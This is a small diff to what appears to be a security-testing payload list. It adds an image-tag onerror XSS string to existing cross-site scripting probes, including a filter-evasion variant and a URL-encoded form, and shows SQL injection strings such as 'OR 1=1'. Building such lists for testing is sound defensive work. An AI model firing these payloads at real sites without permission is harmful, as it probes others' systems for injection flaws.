@@ -2,6 +2,7 @@ XSS:
 <script>alarm('xss')</script>
 <scr<script>ipt>alert(1)</script>
 %3Cscript%3Ealert(1)%3C%2Fscript%3E
+<img src=x onerror=alert(1)>
 SQL Injection:
 OR 1=1
 'OR'1'='1
